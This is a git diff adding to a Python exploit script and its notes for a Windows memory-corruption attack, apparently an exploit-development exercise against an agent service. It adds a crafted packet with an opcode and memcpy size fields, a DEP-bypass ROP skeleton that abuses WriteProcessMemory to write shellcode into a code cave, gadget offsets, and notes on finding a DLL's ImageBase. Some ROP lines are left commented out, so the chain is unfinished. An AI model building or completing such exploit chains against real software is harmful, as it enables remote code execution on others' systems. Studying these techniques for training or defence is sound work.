@@ -172,7 +172,10 @@ WPM takes
 - lpNumberOfBytesWritten	<- DWORD in the .data section
 
 
-
+Now ROP gadgets have to be offset based
+to get image base
+baseDLLAddr + 3c -> PE Header
+baseDLLAddr + PEHeader + 34 -> ImageBase
 
 =============================================================================
 
@@ -349,8 +352,45 @@ def main():
         # ************************************ Abuse WPM *************************************
         # ************************************************************************************
 
-     
+        # psAgentCommand
+        buf = bytearray([0x41] * 0xC)
+        buf += pack("<i", 0x534)  # opcode
+        buf += pack("<i", 0x0)  # 1st memcpy: offset
+        buf += pack("<i", 0x700)  # 1st memcpy: size field
+        buf += pack("<i", 0x0)  # 2nd memcpy: offset
+        buf += pack("<i", 0x100)  # 2nd memcpy: size field
+        buf += pack("<i", 0x0)  # 3rd memcpy: offset
+        buf += pack("<i", 0x100)  # 3rd memcpy: size field
+        buf += bytearray([0x41] * 0x8)
 
+        # psCommandBuffer
+        wpm = pack("<L", (WPMAddr))  # WriteProcessMemory Address
+        wpm += pack("<L", (libraryBase + 0x92C04))  # Shellcode Return Address
+        wpm += pack("<L", (0xFFFFFFFF))  # pseudo Process handle
+        wpm += pack("<L", (libraryBase + 0x92C04))  # Code cave address
+        wpm += pack("<L", (0x41414141))  # dummy lpBuffer (Stack address)
+        wpm += pack("<L", (0x42424242))  # dummy nSize
+        wpm += pack("<L", (libraryBase + 0xE401C))  # lpNumberOfBytesWritten
+        wpm += b"A" * 0x10
+
+        offset = b"A" * (276 - len(wpm))
+        eip = pack("<L", (libraryBase + 0x408d6))  # push esp; pop esi; ret <- Save ESP to ESI
+
+
+        # Patching lpBuffer
+        # rop = 
+        # mov eax, esi; 
+
+
+        # # Patching lpBuffer, need it to point to our shellcode address on stack
+        # rop = pack("<L", (dllBase + 0x296f))     # mov eax, esi; pop esi; ret
+        # rop += pack("<L", (0x42424242))          # dummy value
+        # rop += pack("<L", (dllBase + 0x117c))    # pop ecx; ret
+        # rop += pack("<L", (0x88888888))          # push huge value to 
+        # rop += pack("<L", (dllBase + 0x1d0f0))  
+        # rop += pack("<L", (dllBase + 0x117c))   
+        # rop += pack("<L", (0x77777878))
+        # rop += pack("<L", (dllBase + 0x1d0f0))  
     except KeyboardInterrupt:
         print(Fore.RED + "\n[!] User requested shutdown" + Style.RESET_ALL)
         return 1
